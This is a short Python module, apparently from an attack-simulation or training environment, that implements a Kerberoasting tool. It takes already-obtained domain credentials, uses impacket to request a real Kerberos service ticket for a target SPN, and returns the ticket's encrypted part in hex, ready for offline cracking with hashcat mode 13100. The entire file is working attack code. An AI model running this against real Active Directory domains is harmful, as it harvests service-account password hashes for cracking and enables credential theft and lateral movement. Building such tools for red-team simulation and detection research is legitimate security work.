"""Kerberoasting attack tool (Event ID 4769-style), modeled on the patterns in
`datasets.splunk_ad_kerberos_loader`.

Requests a real Kerberos TGS for a target SPN via impacket, using
credentials already obtained earlier in the episode, and returns the
service ticket's encrypted part -- the piece that's crackable offline
(hashcat mode 13100 for the common RC4/etype-23 case) once fed to that
tool. impacket is imported lazily since it's a heavy dependency not needed
to import this module.
"""
from __future__ import annotations


def kerberoast(
    target_host: str,
    domain: str,
    username: str = "",
    password: str = "",
    spn: str = "",
) -> dict:
    if not username or not password or not spn:
        raise ValueError("kerberoast requires username, password, and a target spn")

    from pyasn1.codec.der import decoder as der_decoder

    from impacket.krb5 import constants
    from impacket.krb5.asn1 import TGS_REP
    from impacket.krb5.kerberosv5 import getKerberosTGS, getKerberosTGT
    from impacket.krb5.types import Principal

    client_principal = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    tgt, cipher, _key, session_key = getKerberosTGT(
        client_principal, password, domain, "", "", "", target_host
    )

    server_principal = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
    tgs_bytes, _cipher, _session_key, _new_session_key = getKerberosTGS(
        server_principal, domain, target_host, tgt, cipher, session_key
    )

    decoded = der_decoder.decode(tgs_bytes, asn1Spec=TGS_REP())[0]
    enc_part = decoded["ticket"]["enc-part"]

    return {
        "target_host": target_host,
        "domain": domain,
        "spn": spn,
        "etype": int(enc_part["etype"]),
        "ticket_cipher_hex": bytes(enc_part["cipher"]).hex(),
    }
